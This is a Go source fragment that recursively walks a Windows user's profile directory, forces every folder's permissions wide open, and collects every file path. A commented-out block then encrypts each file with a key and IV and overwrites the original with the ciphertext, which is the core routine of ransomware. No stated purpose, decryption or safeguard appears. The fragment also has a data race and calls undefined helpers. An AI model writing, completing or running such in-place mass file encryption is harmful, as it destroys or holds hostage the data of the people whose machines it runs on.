

/*


package main

import (
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"time"
)

type Dirs struct {
	fName    []string
	dirList  []string
	fType    map[string]string
	fContent []byte
	dirEnt   []os.DirEntry
}

type fData struct {
	file Dirs
	sync.WaitGroup
}

const (
	loc = `C:\Users\mukaila samsondeen`
)

func main() {

	fd := fData{}

	now := time.Now()
	fd.Walker(loc)
	fmt.Println(len(fd.file.dirList))
	dur := time.Now().Sub(now)
	fmt.Println(dur)

}

func (fd *fData) CheckSetM(path string) bool {

	mod, _ := os.Stat(path)
	mo := mod.Mode()
	if mo.String() != "drwxrwxrwx" {
		err := os.Chmod(path, os.ModePerm)
		if err != nil {
			//
		}
		return true
	}

	return true

}

func (fd *fData) Walker(path string) {
	var wg sync.WaitGroup

	fd.CheckSetM(path)
	f, err := os.ReadDir(path)
	if err != nil {
		fmt.Println(err)
	}

	for _, file := range f {
		npath := filepath.Join(path, file.Name())
		if file.IsDir() {
			wg.Add(1)
			go func() {
				fd.Walker(npath)
				wg.Done()
			}()
		} else {
			fd.file.dirList = append(fd.file.dirList, npath)
		}
	}

	wg.Wait()

}

/*


for _, name := range files {

		file, err = readFile(name)
		if err != nil {
			time.Sleep(time.Second * 1)
			err = err
		}

		wg.Add(1)
		go func(key []byte, iv []byte, file []byte) {
			cipherText := Encrypt(file, key, iv)
			fd, _ := os.Create(name)
			fd.Write(cipherText)
			wg.Done()
		}(key, iv, file)

	}

*/
